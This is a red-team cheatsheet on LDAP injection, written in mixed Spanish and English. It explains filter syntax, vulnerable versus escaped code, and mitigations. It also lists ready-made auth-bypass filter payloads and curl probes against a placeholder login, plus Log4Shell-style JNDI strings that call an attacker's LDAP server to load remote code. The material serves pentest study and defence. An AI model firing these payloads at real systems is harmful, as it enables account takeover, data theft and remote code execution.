---
aliases:
  - LDAP Injection
  - LDAPi
  - LDAP Bind Injection
tags:
  - vuln/ldap-injection
  - technique/initial-access
  - technique/credential-access
  - technique/execution
  - asset/web-app
  - asset/directory-service
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[LDAP Injection - Auth Bypass]]"
  - "[[LDAP Injection - Info Disclosure y Blind]]"
  - "[[LDAP Injection - Filter Manipulation]]"
  - "[[LDAP Injection - JNDI y Entry Injection]]"
  - "[[LDAP Injection - Tooling]]"
  - "[[Authentication & Authorization Bypass]]"
  - "[[Insecure Deserialization]]"
  - "[[Burp Suite]]"
---
# LDAP Injection

---

## Cheatsheet

### 🔓 Auth Bypass

````tabs
tab: **Sub-Filter Injection en Login**
![[LDAP Injection - Auth Bypass#^ldap-bypass-subfilter]]

tab: **Empty / NULL Bind**
![[LDAP Injection - Auth Bypass#^ldap-bypass-emptybind]]

tab: **Filter Manipulation Variants**
![[LDAP Injection - Auth Bypass#^ldap-bypass-filter-types]]

tab: **Active Directory-Specific Bypass**
![[LDAP Injection - Auth Bypass#^ldap-bypass-ad]]
````

### 📋 Information Disclosure / Blind Extraction

````tabs
tab: **Wildcards para Enumeración**
![[LDAP Injection - Info Disclosure y Blind#^ldap-disclosure-wildcards]]

tab: **Boolean-Based Char-by-Char**
![[LDAP Injection - Info Disclosure y Blind#^ldap-disclosure-boolean]]

tab: **Time-Based Oracle**
![[LDAP Injection - Info Disclosure y Blind#^ldap-disclosure-time]]

tab: **Error-Based Leak**
![[LDAP Injection - Info Disclosure y Blind#^ldap-disclosure-error]]
````

### 💉 Filter Manipulation

````tabs
tab: **AND / OR Injection**
![[LDAP Injection - Filter Manipulation#^ldap-filter-andor]]

tab: **Nested Filters**
![[LDAP Injection - Filter Manipulation#^ldap-filter-nested]]

tab: **LDAP Attribute Injection (Add/Modify)**
![[LDAP Injection - Filter Manipulation#^ldap-filter-attribute]]

tab: **LDAP Comments y Null-Byte**
![[LDAP Injection - Filter Manipulation#^ldap-filter-comments]]
````

### 🔗 JNDI / Entry Injection

````tabs
tab: **JNDI Lookup (Log4Shell-style)**
![[LDAP Injection - JNDI y Entry Injection#^ldap-jndi-lookup]]

tab: **LDAP Entry Poisoning**
![[LDAP Injection - JNDI y Entry Injection#^ldap-jndi-entry]]

tab: **LDAP Referral Abuse**
![[LDAP Injection - JNDI y Entry Injection#^ldap-jndi-referral]]

tab: **Schema-Based Gadgets**
![[LDAP Injection - JNDI y Entry Injection#^ldap-jndi-schema]]
````

### 🛠️ Tooling

````tabs
tab: **ldapsearch CLI**
![[LDAP Injection - Tooling#^ldap-tool-ldapsearch]]

tab: **ldap3 (Python lib)**
![[LDAP Injection - Tooling#^ldap-tool-ldap3]]

tab: **JNDI Exploit Kits (Log4Shell)**
![[LDAP Injection - Tooling#^ldap-tool-jndi]]

tab: **Wordlists y Resources**
![[LDAP Injection - Tooling#^ldap-tool-wordlists]]
````

---

## Overview

**LDAP Injection** = atacante manipula filtros LDAP construidos dinámicamente con user input, permitiendo bypass de auth, exfiltración de datos del directorio, modificación de entries, o RCE via JNDI. Vector clase A en stacks Java enterprise (corp SSO, AD-backed apps), Linux con OpenLDAP, FreeIPA, OpenDJ.

LDAP (Lightweight Directory Access Protocol) es backend universal de identity/auth en orgs medium+ — directory services para users, groups, computers, certs, services. App vulnerable concatena input a filter string sin escape correcto.

### Filter syntax básico (RFC 4515)

```
filter         = "(" expression ")"
expression     = simple | composed
simple         = attr "=" value      # equality
                | attr "=*"           # presence
                | attr "~=" value     # approx
                | attr "<=" value     # less-or-eq
                | attr ">=" value     # greater-or-eq
                | attr "=" "*" value  # substring
composed       = "&" filterlist       # AND
                | "|" filterlist      # OR
                | "!" filter          # NOT
filterlist     = filter+

# Ejemplo:
(&(uid=admin)(userPassword=secret))
   ^^^ AND ^^^ ^^^ AND ^^^

(|(uid=admin)(uid=root))
   ^^^ OR matches admin OR root
```

### Diferencia con SQLi

| | **SQLi** | **LDAP Injection** |
|---|---|---|
| Lenguaje | SQL | LDAP filter |
| Quote escape | `'` | `(`, `)`, `*`, `\` |
| Comments | `--`, `#` | NO standard comments |
| Wildcards | `%` | `*` |
| Logic | AND/OR | `&` `|` `!` |
| Common impact | Data extraction, RCE | Auth bypass, data extraction, JNDI RCE |
| Tooling | `sqlmap` | `ldap3`, custom scripts |

---

## Workflow de explotación

```
1. Identificar endpoint con LDAP backend:
   - Login form corp
   - Search directory
   - User auto-complete
   - Password reset (corp)

2. Probe injection:
   - `*` wildcard → multiple results = vuln
   - `(`, `)` → filter syntax error = vuln
   - `*)(uid=*` → sub-filter inject

3. Fingerprint directory server:
   - RootDSE query: ldapsearch -H ... -b "" -s base
   - Error patterns reveal vendor
   - Schema enumeration

4. Decidir vector:
   a. Auth bypass:
      - `*)(uid=*))(|(uid=*` en username field
   b. Information disclosure:
      - Wildcards `(uid=*)`
      - Blind char-by-char con boolean oracle
   c. Filter manipulation:
      - AND/OR injection para bypass conditions
   d. JNDI RCE:
      - `${jndi:ldap://attacker/Exploit}` en logged input
   e. Entry poisoning:
      - LDIF injection en register/profile

5. Validate impact:
   - Login as admin?
   - Enumerated all users?
   - JNDI shell triggered?

6. Post-explotación:
   - Si LDAP server access → ldapsearch full enum
   - Combine con AD attack tools (Impacket, BloodHound)
```

---

## Detección rápida

### Indicadores en código backend

```java
// Java — VULN
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
NamingEnumeration<SearchResult> results = ctx.search("dc=target,dc=com", filter, controls);

// Java — SAFE (parametrized)
String filter = "(&(uid={0})(userPassword={1}))";
ctx.search("dc=target,dc=com", filter, new String[]{username, password}, controls);

// O escape manual:
String safe = LdapFilterEncoder.filterEncode(username);  // escape *, (, ), \
```

```php
// PHP — VULN
$filter = "(&(uid=" . $username . ")(userPassword=" . $password . "))";
ldap_search($conn, "dc=target,dc=com", $filter);

// PHP — SAFE
$filter = "(&(uid=" . ldap_escape($username, "", LDAP_ESCAPE_FILTER) .
          ")(userPassword=" . ldap_escape($password, "", LDAP_ESCAPE_FILTER) . "))";
```

```python
# Python — VULN
filter = f"(&(uid={username})(userPassword={password}))"
conn.search('dc=target,dc=com', filter)

# Python — SAFE
import ldap.filter
filter = ldap.filter.filter_format("(&(uid=%s)(userPassword=%s))", [username, password])
```

### Probes mínimos

```bash
# 1. Wildcard probe
curl -d "username=*&password=any" https://target/login

# 2. Paréntesis probe (syntax error oracle)
curl -d "username=(&password=any" https://target/login

# 3. Sub-filter inject
curl -d "username=*)(uid=*&password=any" https://target/login

# 4. Universal auth bypass
curl -d "username=*)(|(uid=*&password=anything" https://target/login

# 5. JNDI RCE probe (Log4Shell pattern, en Java apps)
curl -H 'User-Agent: ${jndi:ldap://canary.oast.fun/x}' https://target/

# 6. Direct LDAP probe (si server expuesto)
ldapsearch -H ldap://target -x -s base -b ""
```

---

## Impacto

- **Auth bypass total** — login as admin/root con `*)(|(uid=*` payload.
- **Information disclosure** — enumerar todos los users + attributes (mail, phone, role).
- **Password leak** — algunos servers OpenLDAP exponen `userPassword` (hashed).
- **AD enumeration** — listar Domain Admins, group memberships, SPNs.
- **Privilege escalation** — modify entry attributes (memberOf, userPassword) si write permitted.
- **JNDI RCE (Log4Shell-class)** — `${jndi:ldap://...}` injection en logged input → arbitrary Java code.
- **Lateral movement** — credentials disclosed via referral abuse.
- **DoS** — heavy filter expressions exhaust server.
- **Persistence** — LDIF injection crea backdoor user/group.
- **Schema disruption** — modify schema si admin compromised.

---

## Mitigación (defender)

- **Parametrized filters** — usar libs que escapen automáticamente:
  - Java: `LdapFilterEncoder.filterEncode()` o JNDI con bind variables.
  - PHP: `ldap_escape($input, "", LDAP_ESCAPE_FILTER)`.
  - Python: `ldap.filter.filter_format()`.
  - Node: `ldapauth-fork` con sanitization built-in.
- **Whitelist de characters** — username solo `[a-zA-Z0-9._-]`, no `* ( ) | & \`.
- **Bind con dedicated service account** — no usar credentials del user para query LDAP.
- **Disable anonymous bind** — `disallow bind_anon` en OpenLDAP.
- **Disable referral chasing** — `chase_referrals=false` para auth.
- **TLS / LDAPS only** — `ldap://` plaintext no.
- **Minimal permissions del bind account** — solo read sobre attrs necesarios.
- **No log raw input con frameworks vulnerable** — Log4j ≥ 2.17.0 patched JNDI lookup.
- **Disable JNDI lookups** explicitamente:
  ```
  -Dlog4j2.formatMsgNoLookups=true
  ```
- **Log4j upgrade** — todos los apps Java ≥ 2.17.0.
- **WAF rules** — block `${jndi:`, common LDAP injection patterns.
- **Schema validation** — input types enforce.
- **Rate limit + monitoring** — detect enumeration attempts.

---

## Para entender LDAP Injection

**Por qué LDAP es target:**

LDAP es backbone de identity en orgs (Active Directory, OpenLDAP). App quiere "auth user X" → construye filter `(&(uid=X)(password=Y))` → server retorna entry si match. Si X o Y son user input concatenados, atacante manipula filter.

LDAP filter syntax es small DSL — pocos caracteres especiales (`* ( ) | & ! \`), pero efecto profundo. Quote escape NO funciona como SQLi — LDAP no usa quotes alrededor de values.

**Por qué Log4Shell (JNDI) cambió todo:**

Pre-2021, LDAP injection era vector específico. Log4Shell (CVE-2021-44228) reveló que **cualquier input loggeado** en Java Log4j con expresiones `${jndi:ldap://attacker}` triggea JNDI lookup → atacante's LDAP server retorna malicious Java class → RCE.

Esto convirtió LDAP injection en vector indirecto: no necesitás endpoint LDAP-backed, solo necesitás logging que use Log4j.

**Diferencia LDAP search vs bind:**

- **Bind**: auth, "log me in as X with password Y". Server replies success/fail.
- **Search**: query directory, "give me all users where Z". Server replies entries.

LDAP injection en bind → auth bypass.
LDAP injection en search → information disclosure.

App típica:
1. **Bind** con service account.
2. **Search** for username del user.
3. Re-bind con DN del user + password proveída → auth.

Inyección en step 2 search puede retornar admin's DN para step 3 bind con own password — pero no funciona porque pass del admin no controlada. Pero si filter retorna multiple → app puede bind con first match (admin) en algunos impl.

---

## Recursos

- [PortSwigger - LDAP Injection](https://portswigger.net/web-security/ldap-injection) — labs y conceptos.
- [PayloadsAllTheThings - LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection) — payloads.
- [HackTricks - LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection) — referencia.
- [OWASP - LDAP Injection Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html) — defensas.
- [RFC 4515 - LDAP Search Filters](https://datatracker.ietf.org/doc/html/rfc4515) — spec.
- [RFC 4511 - LDAP Protocol](https://datatracker.ietf.org/doc/html/rfc4511) — protocol.
- [JNDI Injection / Log4Shell](https://blog.nccgroup.com/2021/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/) — NCC paper.
- [JNDI-Injection-Exploit (welk1n)](https://github.com/welk1n/JNDI-Injection-Exploit) — tool.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — AD enumeration post-LDAP.
- [Active Directory Attack Resources](https://github.com/Orange-Cyberdefense/arsenal) — combined toolkit.

---
